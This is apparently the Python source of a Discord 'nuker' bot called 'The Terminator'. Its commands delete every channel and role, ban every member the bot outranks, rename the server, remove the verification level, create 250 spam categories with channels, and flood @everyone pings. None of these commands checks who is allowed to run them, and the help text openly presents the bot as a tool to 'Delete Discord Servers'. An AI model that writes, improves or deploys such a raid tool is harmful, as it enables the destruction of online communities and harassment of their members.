import discord, time, json
from asyncore import loop
from discord.ext import commands

with open('config.json') as f:
    config = json.load(f)

TOKEN = config.get('TOKEN')
PREFIX = config.get('PREFIX')

intents = discord.Intents.all()
client = commands.Bot(command_prefix=PREFIX, intents=intents)
client.remove_command('help')


@client.event
async def on_ready():
    print('The Terminator Has launched')
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"With {len(client.guilds)} Servers ")) # Set it to whatever u want


# Try not to touch anything below here unless you know what you're doing

@client.group(invoke_without_command=True)
async def help(ctx):
    embed=discord.Embed(title="Help Commands", color=0x00ff04)
    embed.add_field(name="Deleters", value="!help Deleters", inline=True)
    embed.add_field(name="Other", value="!help other", inline=True)
    embed.add_field(name="Neutral", value="!help Neutral", inline=True)
    embed.set_footer(text="For a more in-depth explanation simply type !help <command>")
    await ctx.send(embed=embed)

@help.command()
@commands.cooldown(1,5,commands.BucketType.user)
async def neutral(ctx):
    embed=discord.Embed(title="Help Category: Neutral", description="Things that are in the middle of the other categorys", color=0x0011ff)
    embed.add_field(name="`Spam`", value="Spams the message requsted as manny times as requested", inline=True)
    embed.set_footer(text="For a more in-depth explanation simply type !help <command>")
    await ctx.channel.send(embed=embed)

@help.command()
@commands.cooldown(1,5,commands.BucketType.user)
async def other(ctx):
    embed=discord.Embed(title="Help Category: Other", description="Things that do not fit in the other categorys", color=0x575866)
    embed.add_field(name="`Channelinfo`", value="Gives you information on a channel", inline=True)
    embed.add_field(name="`Channelrename`", value="Renames the current channel to the name that was requested", inline=True)
    embed.add_field(name="Updates", value="a List of updates to the bot", inline=True)
    embed.set_footer(text="For a more in-depth explanation on each command simply type !help <command>")
    await ctx.send(embed=embed)

@client.group(invoke_without_command=True)
@commands.cooldown(1,15,commands.BucketType.user)
async def updates(ctx):
    embed=discord.Embed(title="Updates", description="Updates to the bot", color=0xff6600)
    embed.add_field(name="Help Command Rewrite", value="`!updates help-rewrite`")
    embed.add_field(name="New Command", value="`!updates newcommand_1`")
    await ctx.send(embed=embed)

@updates.command(aliases=['newcommand_1'])
@commands.cooldown(1,30,commands.BucketType.user)
async def newcommand1(ctx):
    embed=discord.Embed(title="New Command", description="A new command has been added to the bot", color=0x2bff00)
    embed.add_field(name="Updates Command", value="An Updates command has been added, you can veiw all the bots updates and changes with this command.", inline=False)
    await ctx.send(embed=embed)

@updates.command(aliases=['help-rewrite'])
@commands.cooldown(1,30,commands.BucketType.user)
async def helprewrite(ctx):
    embed=discord.Embed(title="Help Command Rewrite", color=0x00fbff)
    embed.add_field(name="Information:", value="The help command has been COMPLETLY re-written and is now each in its own category, all commands are now in their own category such as Deleters `!help deleters`, Other `!help other`, & Finally the newest category *Neutral* `!help neutral`")
    await ctx.send(embed=embed)

@help.command(aliases=["deleter", "discorddeleters", "discorddeleter", "dd"])
@commands.cooldown(1,5,commands.BucketType.user)
async def deleters(ctx):
    embed=discord.Embed(title="Help Category: Deleters", description="Delete Discord Servers", color=0xff0000)
    embed.add_field(name="`Nuker`", value=f"Deletes all the channels, voice channels, roles (that are not higher than the bots highest role), and categorys and makes 1 channel with the name `Nuked`", inline=True)
    embed.add_field(name="`Terminate`", value=f"Delete every channel, role (that is not higher than the bots current role), voice channel, & category and replace them with channels with the name ""Nuked", inline=True)
    embed.add_field(name="`Purge`", value="Deletes the amount of messages requested, **MAX = 250**", inline=True)
    embed.add_field(name="`Clear`", value="Deletes all the channels and makes 1 channel with the name `Channels CLEARED`", inline=True)
    embed.add_field(name="`Banall`", value="Bans all the users (who do not have a role higher than the bot) PERMANENTLY with the reason that was requested", inline=True)
    await ctx.send(embed=embed)

@help.command(aliases=['nuke'])
@commands.cooldown(1,3,commands.BucketType.user)
async def nuker(ctx):
    embed=discord.Embed(title="Nuker", color=0xff0000)
    embed.add_field(name="Information", value=f"A command that deletes all channels, voice channels, categoreys")
    embed.add_field(name="Usage", value=f"Add this bot to your server and type !nuke and all the channels will be deleted")
    await ctx.send(embed=embed)

@help.command()
@commands.cooldown(1,5,commands.BucketType.user)
async def terminate(ctx):
    embed=discord.Embed(title="Terminator", color=0x0315ff)
    embed.add_field(name="Information", value="A command that deletes EVERYTHING and makes hundereds of channels using specific names. It also makes a role using the same name as the channels")
    embed.add_field(name="Usage", value='Type !terminate in chat and the I will start to delete EVERYTHING')
    await ctx.send(embed=embed)

@help.command(aliases=['cr', 'renamechannels'])
@commands.cooldown(1,3,commands.BucketType.user)
async def channelrename(ctx):
        embed=discord.Embed(title="Channel Renamer", color=0x26c4d9)
        embed.add_field(name="Information", value="A command that renames all channels to what was requested", inline=True)
        embed.add_field(name="Usage", value="!channelrename <name>", inline=True)
        embed.add_field(name="Examples", value='!channelrename poptarts', inline=False)
        await ctx.send(embed=embed)

@help.command(aliases=['bannall', 'ban'])
@commands.cooldown(1,3,commands.BucketType.user)
async def banall(ctx):
        embed=discord.Embed(title="Banall", color=0x9e0000)
        embed.add_field(name="Information", value="A command that Bans ALL users in the server (that do not have a role higher than it) for the reason specified (if custom reason is enabled)", inline=True)
        embed.add_field(name="Usage", value="!banall **OR** !banall <reason>", inline=True)
        embed.add_field(name="Examples", value='!banall **OR** !banall bumheads', inline=False)
        await ctx.send(embed=embed)

@client.command()
async def banall(ctx):
    reason="Server Nuked" # Set this to ban reason
    await ctx.message.delete()

    for member in ctx.guild.members:

        try:

            await member.ban(reason=reason)
            print(f"[!] BAN: {member} was banned for {reason}")

        except:
            pass

# @client.command()                                     # REMOVE THE # AT THE BEGINING OF THE LINE FOR ALL OF THE LINES AND ADD A # TO THE BEGINING OF THE OTHER LINE OF CODE TO REPLACE IT
# async def banall(ctx, reason):
#     await ctx.message.delete()
#     await ctx.send(f"Banning all users from this discord server for {reason}")
#     for member in ctx.guild.members:
# 
#         try:
# 
#             await member.ban(reason=reason)
#             print(f"[!] BAN: {member} was banned for {reason}")
# 
#         except:
# 
#             pass



@client.command(aliases=['nuker'])
async def nuke(ctx):

    await ctx.message.delete()

    print("\n=======================")

    print("DELETING CHANELS...")

    print("=======================\n")

    i = 0

    for c in ctx.guild.channels:
        i = i + 1
        await c.delete()
        print(f"[-] channel deleted, {i} done")
	
    print("\n=======================")

    print("CREATING CHANELS...")

    print("=======================\n")
    guild = ctx.message.guild

    for i in range(1):
        await guild.create_text_channel("nuked")
        print(f"[+] channel created, {i} done")#                                                                                   Set the name to whatever u want the discord servers name to be 

    await ctx.guild.edit(default_notifications=discord.NotificationLevel.all_messages,verification_level=discord.VerificationLevel.none ,name="Nuked", icon=None)

@client.command()
async def terminate(ctx):  
    await ctx.message.delete()
    await ctx.send(f"\n=======================")
    await ctx.send(f"Deleting Channels, Categorys, Roles, And Voice Channels ")
    await ctx.send("\n=======================")
    time.sleep(2)
    
    print("\n=======================")
    print(f"Deleting Channels, Categorys, Roles, & Voice Channels in 3")
    time.sleep(1)
    print("2")
    time.sleep(1)
    print("1")
    time.sleep(1)
    print("=======================")
    time.sleep(1)
    for channel in ctx.guild.channels:
        try:
           await channel.delete()
           print(f"[-] CHANNEL: {channel} deleted")
        except:
           print(f"CHANNELS ERROR:\nCouldn't delete {channel}, that stinks")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"[-] ROLE: {role} deleted")
        except:
            print(f"ROLES ERROR: \nCouldn't delete {role}, that stinks")#                                           Set the name to whatever u want the discord servers name to be 
    await ctx.guild.edit(default_notifications=discord.NotificationLevel.all_messages,verification_level=discord.VerificationLevel.none ,name="Nuked BOZOS", icon=None)
    for x in range(250):
        category = await ctx.guild.create_category(name="Nuked")
        await ctx.guild.create_text_channel(category=category, name="Nuked") # Set the name to whatever u want the channel name to be
        await ctx.guild.create_voice_channel(category=category, name="Nuked")# Set the name to whatever u want the voice channel name to be
        print(f"[C] Channel {x} created")
    for x in range(1):
        await ctx.guild.create_role(name="Nuked", color=0xff0000) # Set the name to whatever u want the role name to be


@client.command()
async def test(ctx):
    
    for _i in range(55):
        await ctx.send(f"{ctx.author} THIS IS A TEST RUN!!!!!!!!!!!!")

@client.command()
async def spam(ctx, amount: int, *, message):

    await ctx.message.delete()

    for _i in range(amount):

        await ctx.send(message)

@client.command()
async def purge(ctx, amount=250): # edit the number to how ever much times you would like
    amount = amount + 1
    if amount > 501: # make sure to edit this number here to be 1 more than the amount u set above
        await ctx.send('Can not delete more than 500 messages at once!')
    else:
        await ctx.channel.purge(limit=amount)
        await ctx.send(f'Purged the channel {ctx.channel}, requested by {ctx.author}')
        await ctx.message.delete()

@client.command()
async def clear(ctx):

    await ctx.message.delete()

    print("\n=======================")

    print("DELETING CHANELS...")

    print("=======================\n")

    i = 0
    for c in ctx.guild.channels:
        i = i + 1
        await c.delete()
        print(f"[D] channel deleted, {i} done")

    print("Done !")

    channel = await ctx.guild.create_text_channel("Channels CLEARED")
    print("Done clearing channels")

    for i in range(25): # edit the number to how ever much times you would like
        await channel.send("@everyone DISCORD NUKED")
    await channel.send("LLLLLLLLLLLLL")


@client.command(aliases=['renamechannels', 'cr'])
async def channelrename(ctx, *, name):

    await ctx.message.delete()

    for channel in ctx.guild.channels:

        await channel.edit(name=name)

        print(f"[E] CHANNEL: Renamed {channel}")

@channelrename.error
async def channelrename_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed=discord.Embed(title="Inncorrect Usage", color=0xff0000)
        embed.add_field(name="Correct Usage", value=f"!channelrename <name>")
        embed.add_field(name="Examples", value='!channelrename poptarts')
        await ctx.send(embed=embed)

@banall.error
async def banall(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed=discord.Embed(title="Inncorrect Usage", color=0xff0000)
        embed.add_field(name="Correct Usage", value=f"!banall <reason>")
        embed.add_field(name="Examples", value='!banall dumbheads')
        await ctx.send(embed=embed)


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        msg = '**ERROR**! You are still on cooldown! please try again in {:.2f}s'.format(error.retry_after)
        await ctx.send(msg)


@client.command()
async def channelinfo(ctx):
    await ctx.send(({ctx.channel}))

client.run(TOKEN)